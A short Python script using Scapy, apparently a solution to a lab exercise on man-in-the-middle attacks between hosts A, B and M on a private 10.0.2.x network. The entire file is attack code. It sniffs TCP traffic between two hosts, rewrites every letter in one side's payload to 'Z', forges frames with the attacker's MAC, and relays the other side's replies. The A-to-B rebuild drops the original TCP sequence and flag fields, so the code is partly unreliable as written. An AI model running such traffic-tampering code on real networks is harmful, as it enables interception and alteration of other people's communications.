#!/usr/bin/env python3
from scapy.all import *
import re

# Correct IP and MAC addresses for Hosts A, B, and M
A_IP = "10.0.2.4"
A_MAC = "08:00:27:1b:11:df"
B_IP = "10.0.2.5"
B_MAC = "08:00:27:da:74:5d"
M_MAC = "08:00:27:aa:b1:56"

def spoof_pkt(pkt):
    if pkt[IP].src == A_IP and pkt[IP].dst == B_IP and pkt.haslayer(TCP) and pkt.haslayer(Raw):
        data = pkt[Raw].load.decode('utf-8', errors='ignore')
        data = re.sub(r'[a-zA-Z]', 'Z', data)  # Replace all letters with 'Z'
        # Remove the old checksums
        del(pkt[IP].chksum)
        del(pkt[TCP].chksum)
        # Construct the new packet
        newpkt = Ether(src=M_MAC, dst=B_MAC) / IP(src=A_IP, dst=B_IP) / TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport) / data
        sendp(newpkt, verbose=False)
        print(f"Data transformed from {pkt[Raw].load} to {data}")

    elif pkt[IP].src == B_IP and pkt[IP].dst == A_IP and pkt.haslayer(TCP):
        # Forward the packet from B to A
        # Remove the old checksums
        del(pkt[IP].chksum)
        del(pkt[TCP].chksum)
        # Construct the new packet
        newpkt = Ether(src=M_MAC, dst=A_MAC) / pkt[IP]
        sendp(newpkt, verbose=False)

pkt = sniff(filter='tcp and (host {} or host {})'.format(A_IP, B_IP), prn=spoof_pkt)
